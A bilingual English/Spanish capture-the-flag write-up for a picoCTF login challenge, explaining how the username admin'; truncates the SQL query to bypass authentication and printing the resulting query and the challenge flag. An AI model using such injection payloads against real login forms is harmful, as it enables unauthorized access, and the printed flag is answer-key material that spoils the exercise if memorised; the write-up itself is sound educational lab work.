## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649

Hay un sitio web funcionando en `https://jupiter.challenges.picoctf.org/problem/64649/` ([enlace](https://jupiter.challenges.picoctf.org/problem/64649/)). Alguien ha omitido el inicio de sesión antes y ahora se está fortaleciendo. ¡Intenta ver si aún puedes iniciar sesión! o http://jupiter.challenges.picoctf.org:64649
### Pistas
1. The password is being filtered.

1. La contraseña se está filtrando.
### Solución
1. Viendo en la página del reto, se puede observar en la parte de "Support" que hay gente diciendo que obtiene un SQL Error, por ende, podemos deducir que esta página usa SQL.
2. Vamos al "Admin Login" y escribimos como el usuario a "admin';"
3. Lo que esto hace es obtener al usuario de admin, ignorando lo demás con el punto y coma, dejandonos acceder al obtener los datos del usuario Admin
```
username: admin';
password: caca
SQL query: SELECT * FROM users WHERE name='admin';' AND password='caca'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}
```
### Notas Adicionales
Para este reto aprendimos a hacer inyecciones a una base de datos desde los campos del sitio, para ello hay que hacer consultas que ya sabemos hacer desde una base de datos.
### Referencias
https://play.picoctf.org/practice/challenge/59
https://jupiter.challenges.picoctf.org/problem/64649/
